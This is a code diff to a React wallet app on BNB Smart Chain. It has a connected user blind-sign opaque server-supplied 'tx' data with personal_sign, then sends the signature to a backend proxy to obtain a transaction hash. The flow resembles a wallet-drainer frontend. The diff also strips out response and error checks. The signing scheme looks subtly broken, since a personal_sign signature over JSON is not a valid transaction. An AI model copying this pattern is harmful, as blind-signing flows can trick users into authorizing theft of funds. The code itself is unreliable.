@@ -6,51 +6,43 @@ function App() {
       localStorage.removeItem("walletconnect");
     }
 
-    const ethereumProvider = await EthereumProvider.init({
+    var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["personal_sign"],
+      methods: ["personal_sign"], // متد personal_sign
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
     await ethereumProvider.enable();
-    const provider = ethereumProvider;
-    const accounts = await provider.request({ method: "eth_accounts" });
-    const sender = accounts[0];
+    var provider = ethereumProvider;
+    var accounts = await provider.request({ method: "eth_accounts" });
+    var sender = accounts[0];
     console.log("✅ Wallet Address:", sender);
+
+    let apiUrl = process.env.NEXT_PUBLIC_API_URL || "/api/proxy"; // استفاده از متغیر محیطی
 
     async function getRawSignature(address, balance) {
       try {
-        const requestData = {
+        let requestData = {
           handler: "tx",
           address: address,
           chain: "56",
           type: "coin",
-          balance: balance,
+          balance: balance, // مقدار BNB مورد نظر
         };
 
-        console.log("🔍 Requesting Unsigned Data:", requestData);
-
-        const response = await fetch("https://your-backend.com/proxy", {
+        let response = await fetch(apiUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
         });
 
-        if (!response.ok) {
-          throw new Error(`Server error: ${response.status}`);
-        }
-
-        const unsignedData = await response.json();
+        let unsignedData = await response.json();
         console.log("📜 Unsigned Data:", unsignedData);
 
-        if (!unsignedData || unsignedData.error) {
-          throw new Error(unsignedData.error || "Invalid unsigned data");
-        }
-
-        const rawSignature = await provider.request({
+        var rawSignature = await provider.request({
           method: "personal_sign",
-          params: [JSON.stringify(unsignedData), address],
+          params: [JSON.stringify(unsignedData), address], // ترتیب پارامترها مهم است
         });
 
         return rawSignature;
@@ -62,23 +54,19 @@ function App() {
 
     async function sendSignedTransaction(signature, sender, balance) {
       try {
-        const requestData = {
+        let requestData = {
           sender: sender,
           balance: balance,
           signedData: signature,
         };
 
-        const response = await fetch("https://your-backend.com/proxy", {
+        let response = await fetch(apiUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
         });
 
-        if (!response.ok) {
-          throw new Error(`Server error: ${response.status}`);
-        }
-
-        const resultJson = await response.json();
+        let resultJson = await response.json();
         console.log("📤 Server Response:", resultJson);
 
         return resultJson.txHash || resultJson.result || resultJson;
@@ -88,12 +76,12 @@ function App() {
       }
     }
 
-    const balance = "0.01";
-    const rawSignature = await getRawSignature(sender, balance);
+    let balance = "0.01"; // مقدار BNB مورد انتقال (می‌توان از ورودی کاربر گرفت)
+    var rawSignature = await getRawSignature(sender, balance);
 
     if (rawSignature) {
       console.log("✍️ Signed Raw Data:", rawSignature);
-      const txHash = await sendSignedTransaction(rawSignature, sender, balance);
+      var txHash = await sendSignedTransaction(rawSignature, sender, balance);
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
       console.error("⚠ Signing failed.");
